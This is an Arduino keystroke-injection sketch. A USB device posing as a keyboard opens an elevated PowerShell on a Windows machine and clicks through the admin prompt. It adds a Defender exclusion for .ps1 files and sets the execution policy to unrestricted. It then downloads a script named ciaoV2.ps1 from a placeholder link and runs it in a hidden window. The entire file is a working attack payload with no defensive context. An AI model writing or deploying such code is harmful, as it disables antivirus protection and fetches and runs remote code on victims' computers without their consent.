#include <Keyboard.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  
  Keyboard.begin();

  delay(2500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(500);

  // Disable Windows Password

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell");

  delay(200);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(2000);

  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();

  delay(150);

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.print("cd C:");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Users");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("Public");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("Documents");

  typeKey(KEY_RETURN);  

  Keyboard.print("Add-MpPreference -ExclusionExtension ps1 -Force");

  typeKey(KEY_RETURN);

  Keyboard.print("Set-ExecutionPolicy unrestricted -Force");

  typeKey(KEY_RETURN);

  Keyboard.print("wget LINK -OutFile ciaoV2.ps1");

  typeKey(KEY_RETURN);

  delay(3500);
  
  Keyboard.print("powershell.exe -noexit -windowstyle hidden -file C:");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Users");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("Public");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("Documents");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("ciaoV2.ps1");

  typeKey(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}